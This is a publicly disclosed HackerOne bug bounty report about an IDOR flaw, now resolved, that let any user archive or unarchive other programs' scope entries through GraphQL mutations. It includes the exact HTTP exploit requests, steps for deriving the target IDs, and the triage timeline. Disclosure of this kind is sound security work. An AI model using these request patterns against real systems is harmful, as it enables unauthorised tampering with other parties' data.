---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2022-04-18
submitted: 2022-03-05T22:21:30.013Z
bounty_usd: null
votes: 318
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "ahacker1"
source: "https://hackerone.com/reports/1501611"
title: "An attacker can archive and unarchive any structured scope object on HackerOne"
---
# An attacker can archive and unarchive any structured scope object on HackerOne

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 318 | **Program:** HackerOne | **Disclosed:** 2022-04-18

- Report: [https://hackerone.com/reports/1501611](https://hackerone.com/reports/1501611)
- CWE: N/A
- Submitted: 2022-03-05T22:21:30.013Z

## Report summary

@ahacker1 found an Insecure Direct Object Reference (IDOR) vulnerability that allowed anyone to archive and unarchive an asset on HackerOne.com. This wasn't an easy vulnerability to spot: when exploited, the system would return an error indicating that the object wasn't found. However, the asset would still be archived or unarchived. We want to thank @ahacker1 for their persistence and disclosing the security vulnerability to us!

**A note on the triage experience**: this was a poor triage experience for the reporter. Although the security analyst followed up after each comment from the reporter, they were unable to reproduce the described vulnerability. The hacker, rightfully so, was persistent that they had found a security vulnerability. 

We're taking steps to improve this. Specifically, HackerOne's security operations team has taken feedback from the engineering team about which questions to ask in the future that will help determine the legitimacy of a security vulnerability faster. Reports will also be assigned to the HackerOne engineering team faster. We are exploring how to roll out these triage changes to other customers. Lastly, HackerOne's engineering team also added a number of asset IDs to [our policy](https://hackerone.com/security/policy_versions?type=team&change=3669996) to help reproduce similar vulnerabilities. We aim to continuously expand this list of known identifiers for hackers to proof security vulnerabilities in production.

That said, we'd be remiss if we didn't acknowledge that this vulnerability was hard to understand. When exploited, the video proof of concept showed a 404 page not found error and did not clearly demonstrate switching between different users or a program that the attacker didn't have access to.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Hello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:
https://hackerone.com
https://api.hackerone.com
...

### Steps To Reproduce

1. Obtain the structured_scope_id: 
This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER
For example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==
Or, it could be found by intercepting the response of the program profile page.

2. Send the Following Request:
``` 
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 388
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: AUTHTOKEN
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
It is also possible to unarchive scopes of other programs with the following request.:
```
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 414
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: ████
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
Even though the response will say no structured scope exists, the scope will be archived.
Replace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.
I will provide an Mp4 PoC soon.

## Impact

An attacker could archive or unarchive all 90000+ scopes on HackerOne.

## Timeline

- **Report Filed**
- **2022-03-05** @ahacker1: Mp4 PoC
- **2022-03-05** @ahacker1: :
- **2022-03-08** @ahacker1: I have also found that the following endpoint: https://api.hackerone.com/customer-resources/?javascript#programs-archive-structured-scope
is vulnerable to the same vulnerability.
- **2022-03-08** @h1_analyst_grace: Hi @ahacker1,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@cool_wave
- **Report Informative**
- **2022-03-08** @ahacker1: Hello,
Scopes are an important component of Hackerone as they give important information to a hacker. By archiving the scope, a hacker is no longer able to see which assets they are able to hack or is in scope. Similarly, by unarchiving a scope, a hacker will believe that they are allowed to hack that scope. To demonstrate this impact, I archived, then quickly unarchived one of the scopes on your team. The proof for this is here: https://hackerone.com/security/scope_versions?type=team
- **2022-03-13** @ahacker1: I have created a team to demonstrate the impact of archiving a scope.
Below are 2 screenshots of the team before the attacker archives the scope of a victim's team:
Policy Page Screenshot:
███████
Submission form screenshot:
██████████
Here is are the screenshots of the page after all the scopes of the team have been archived:
Policy Page:
███
Notice how there are no scopes listed on the team page.
Submission Form:
███
A hacker cannot choose which asset they hacked in the submission form.

Very clearly, there is a significant impact on a team after the scopes have been archived.
Here is the old Mp4 PoC of this:
██████████
(different scopes are used, but it nonetheless demonstrates the impact)
- **2022-03-14** @h1_analyst_grace: Hi @ahacker1,

I hope all is well at your end and thanks for leaving a message!

This would only archive or unarchive the scope for your own program (that is created and owned by you). As such, there doesn’t seem to be any security risk and/or security impact as a result of the behavior you are describing since there is no way that an attacker would be able to benefit from this. This is also not affecting end-users or the application infrastructure.

If you are able to leverage this into a practical exploitation scenario, we will be happy to reevaluate this report.
Thank you and have a great day!

Kind regards,
@cool_wave
- **2022-03-14** @ahacker1: In the Mp4 PoC, I showed that I was able to archive the scopes of another program. In the first half of the video, I demonstrated how the endpoint works. In the second half of the video, I archived the scope of another program, a testing team. 
To demonstrate the exploit, I ask for permission from HackerOne, to archive one of the scopes in the team.
- **2022-03-14** @h1_analyst_grace: Hi @ahacker1,

I hope all is well at your end and thanks for leaving a message!

In the video PoC, you were only able to archive the programs which were owned by you. 

To confirm this, perform the following actions on any report of your created program:
+ Invite another user to that report
+ In another browser login as the invited user
+ Try to archive the program scope as the second user

You will not be able to do so. Thus, there is no security impact here.

If you are able to Archive any program which you don't own please let us know.
Thank you and have a great day!

Kind regards,
@cool_wave
- **2022-03-14** @ahacker1: Previously, I archived, then unarchived one of the scopes of the HackerOne team. 
The proof is here: https://hackerone.com/security/scope_versions?change=155730&type=team
If needed, I can do it again.
- **2022-03-14** @ahacker1: I am able to confirm that I am able to do the following:
- Invite another user to that report
 - In another browser login as the invited user
- archive the program scope as the second user
- **2022-03-15** @h1_analyst_grace: Hi @ahacker1,

Please provide a video PoC showing that you are able to Archive a program (in Hackerone sandbox environment) and that the scope gets archived for **all other users** as well. 

From what I can see, other users will see the scope as it is and it does not get archived for them.

Thank you and have a great day!

Kind regards,
@cool_wave
- **2022-03-15** @ahacker1: I have attached an Mp4 PoC. Since an invited user from a report cannot see the scopes of the program, only the owner of the program can see that the scope has been archived. In the Mp4 PoC, the one sending the requests is not the owner's account.
Because the invited user cannot see the scopes of the program, it is better if you tried to verify the vulnerability. To do so, you can try sending the following request: 
The AUTHTOKEN can be obtained by visiting: https://hackerone.com/current_user/graphql_token.json
```
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 388
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: AUTHTOKEN
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"ArchiveScope","variables":{"structured_scope_id":"STRUCTURED SCOPE ID"},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
█████
- **Report Reopened**
- **Report Triaged**
- **Bounty Awarded**
- **External User Joined**
- **External User Joined**
- **2022-03-16** @ahacker1: Thanks,
I appreciate the generous bounty!
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **External User Joined**
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **Agreed On Going Public**
- **2022-04-08** @ahacker1: Please use limited disclosure for this report! Thanks!
- **2022-04-18** @jobert: @ahacker1 Any particular reason you wouldn't want this to be fully disclosed? As per our policy, every report gets fully disclosed unless there's a good reason not to. Let me know!
- **2022-04-18** @ahacker1: Full disclosure is also fine as long as all attachments are redacted. Thanks!
- **Agreed On Going Public**
- **Report Became Public**
- **Report Title Updated**
